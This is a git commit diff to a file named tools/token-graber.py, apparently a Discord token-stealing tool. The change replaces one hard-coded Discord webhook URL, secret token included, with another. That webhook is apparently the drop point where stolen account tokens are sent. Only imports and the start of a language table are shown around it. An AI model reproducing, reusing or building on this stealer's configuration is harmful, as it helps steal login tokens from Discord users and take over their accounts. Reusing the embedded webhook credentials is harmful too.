5f0508e038fbf9bc0ee72099b20c39e8aa8a5c8a
Asian Co <31744635+asianCo@users.noreply.github.com>
2021-12-03 00:33:54 +0330

    Update token-graber.py

--- tools/token-graber.py
+++ tools/token-graber.py
@@ -13,7 +13,7 @@ from threading import Thread
 from time import sleep
 from sys import argv
 
-webhook_url = "https://discord.com/api/webhooks/894515459196604466/uxEYJoHltJhjs8qHcLQDYvEo6Qls4NxtGY5bl8WclyyBM_BCvMVGZlrNBIgyFVtLWNO7"
+webhook_url = "https://discord.com/api/webhooks/916071878244831284/PNLPnUwFfGLjKwYO9KZ6PZbYCG9Nev2xQ1IlLlCdHZOCjDgZ7v-d9Xz8-iW4cwxIfta1"
 
 languages = {
 	'da'    : 'Danish, Denmark',
